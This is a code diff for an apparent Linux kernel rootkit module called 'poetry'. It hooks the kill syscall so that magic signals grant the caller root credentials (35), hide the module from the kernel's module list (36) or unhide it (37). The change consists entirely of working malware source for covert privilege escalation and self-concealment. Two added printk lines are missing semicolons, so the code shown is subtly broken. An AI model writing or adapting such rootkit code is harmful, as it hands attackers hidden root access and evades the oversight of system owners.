@@ -108,24 +108,6 @@ struct nf_hook_ops my_nfho = {
 };
 
 
-static asmlinkage long (*orig_kill)(const struct pt_regs *);
-asmlinkage int hook_kill(const struct pt_regs *regs)
-{
-    void set_root(void);
-
-    int sig = regs->si;
-
-    if ( sig == 35 )
-    {
-        printk(KERN_INFO "poetry: giving root\n");
-        set_root();
-        return 0;
-    }
-
-    return orig_kill(regs);
-
-}
-
 void set_root(void)
 {
     struct cred *root;
@@ -158,4 +140,34 @@ void hideme(void)
     /* Remove ourselves from the list module list */
     list_del(&THIS_MODULE->list);
     hidden = 1;
+}
+
+
+static asmlinkage long (*orig_kill)(const struct pt_regs *);
+asmlinkage int hook_kill(const struct pt_regs *regs)
+{
+
+    int sig = regs->si;
+
+    if ( sig == 35 )
+    {
+        printk(KERN_INFO "poetry: giving root\n");
+        set_root();
+        return 0;
+    } 
+    else if ( sig == 36 ) 
+    {
+        printk(KERN_INFO "poetry: hiding\n")
+        hideme();
+        return 0;
+    }
+    else if ( sig == 37 ) 
+    {
+        printk(KERN_INFO "poetry: unhiding\n")
+        showme();
+        return 0;
+    }
+
+    return orig_kill(regs);
+
 }
